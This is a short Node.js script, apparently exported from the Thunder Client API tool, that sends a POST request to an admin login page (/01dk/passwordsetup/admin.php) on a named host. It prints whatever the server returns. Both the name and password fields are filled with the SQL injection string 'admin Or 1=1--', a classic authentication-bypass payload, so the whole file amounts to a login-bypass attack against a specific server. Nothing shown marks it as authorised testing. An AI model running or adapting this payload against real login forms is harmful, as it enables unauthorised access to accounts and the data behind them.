const http = require("https");

const options = {
  "method": "POST",
  "hostname": "designshoretest.com",
  "port": null,
  "path": "/01dk/passwordsetup/admin.php",
  "headers": {
    "Accept": "*/*",
    "User-Agent": "Thunder Client (https://www.thunderclient.com)",
    "content-type": "multipart/form-data; boundary=---011000010111000001101001"
  }
};

const req = http.request(options, function (res) {
  const chunks = [];

  res.on("data", function (chunk) {
    chunks.push(chunk);
  });

  res.on("end", function () {
    const body = Buffer.concat(chunks);
    console.log(body.toString());
  });
});

req.write("-----011000010111000001101001\r\nContent-Disposition: form-data; name=\"name\"\r\n\r\nadmin Or 1=1--\r\n-----011000010111000001101001\r\nContent-Disposition: form-data; name=\"password\"\r\n\r\nadmin Or 1=1--\r\n-----011000010111000001101001\r\nContent-Disposition: form-data; name=\"login\"\r\n\r\n\r\n-----011000010111000001101001--\r\n");
req.end();